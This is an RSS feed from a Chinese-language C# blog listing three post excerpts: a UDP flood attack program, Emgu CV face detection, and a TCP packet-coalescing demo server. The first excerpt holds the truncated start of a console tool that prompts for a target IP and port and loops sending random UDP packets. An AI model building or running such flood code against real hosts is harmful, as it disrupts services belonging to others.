<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Csharp on MLOG</title><link>https://qfsyso.github.io/tags/csharp/</link><description>Recent content in Csharp on MLOG</description><generator>Hugo -- 0.126.3</generator><language>zh-CN</language><lastBuildDate>Wed, 11 Dec 2024 21:19:04 +0000</lastBuildDate><atom:link href="https://qfsyso.github.io/tags/csharp/index.xml" rel="self" type="application/rss+xml"/><item><title>Csharp DDOS</title><link>https://qfsyso.github.io/posts/csharp-ddos/</link><pubDate>Wed, 11 Dec 2024 21:19:04 +0000</pubDate><guid>https://qfsyso.github.io/posts/csharp-ddos/</guid><description>UDP 包发 using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class Program { static void Main(string[] args) { Console.Clear(); Console.WriteLine(&amp;#34;UDP Flood Attack&amp;#34;); Console.WriteLine(); // 获取目标 IP 和端口 Console.Write(&amp;#34;IP Target : &amp;#34;); string ip = Console.ReadLine(); Console.Write(&amp;#34;Port : &amp;#34;); int port = int.Parse(Console.ReadLine()); // 准备 UDP 客户端 UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // 生成随机字节数据 // 模拟进度条 Console.Clear(); Console.WriteLine(&amp;#34;Attack Starting&amp;#34;); ShowProgressBar(); // 开始发送 UDP 数据包 int sent = 0; while (true) { try { udpClient.</description></item><item><title>cashrp opencv</title><link>https://qfsyso.github.io/posts/cashrp-opencv/</link><pubDate>Tue, 03 Dec 2024 01:15:38 +0000</pubDate><guid>https://qfsyso.github.io/posts/cashrp-opencv/</guid><description>Emgu CV进行基本的人脸检测。 人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。
安装 Emgu CV 首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：
打开的C#项目。 右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。
搜索并安装Emgu.CV和Emgu.CV.runtime.windows。 // 加载人脸检测分类器 CascadeClassifier faceCascade = new CascadeClassifier(&amp;#34;haarcascade_frontalface_default.xml&amp;#34;); // 读取输入图像 Image&amp;lt;Bgr, byte&amp;gt; inputImage = new Image&amp;lt;Bgr, byte&amp;gt;(&amp;#34;face.jpg&amp;#34;); // 转换为灰度图像，因为人脸检测通常在灰度图像上进行 Image&amp;lt;Gray, byte&amp;gt; grayImage = inputImage.Convert&amp;lt;Gray, byte&amp;gt;(); // 进行人脸检测 Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty); // 在检测到的人脸周围绘制矩形框 foreach (Rectangle face in faces) { inputImage.Draw(face, new Bgr(0, 255, 0), 3); } // 保存标记后的图像为output.jpg inputImage.Save(&amp;#34;output.jpg&amp;#34;); Console.WriteLine(&amp;#34;save~output.jpg&amp;#34;); xml来自 https://github.com/opencv/opencv/tree/master/data/haarcascades
runtime 如果没有 Emgu.CV.runtime.windows 则会加载不了xml</description></item><item><title>packet splicing</title><link>https://qfsyso.github.io/posts/packet-splicing/</link><pubDate>Wed, 27 Nov 2024 22:46:43 +0000</pubDate><guid>https://qfsyso.github.io/posts/packet-splicing/</guid><description>模拟粘包的场景 粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。
使用固定分隔符或包头+包体 常见的解决粘包方案是使用分隔符（如 \n 或特殊字符），或采用固定的包头标识数据长度。
服务端代码
using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class TcpServer { static void Main() { TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine(&amp;#34;Server started, waiting for connection...&amp;#34;); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine(&amp;#34;Client connected!&amp;#34;); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) &amp;gt; 0) { string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($&amp;#34;Received: {receivedData}&amp;#34;); // 模拟数据未分包的场景 Console.WriteLine(&amp;#34;Processing received data...&amp;#34;); string[] messages = receivedData.</description></item></channel></rss>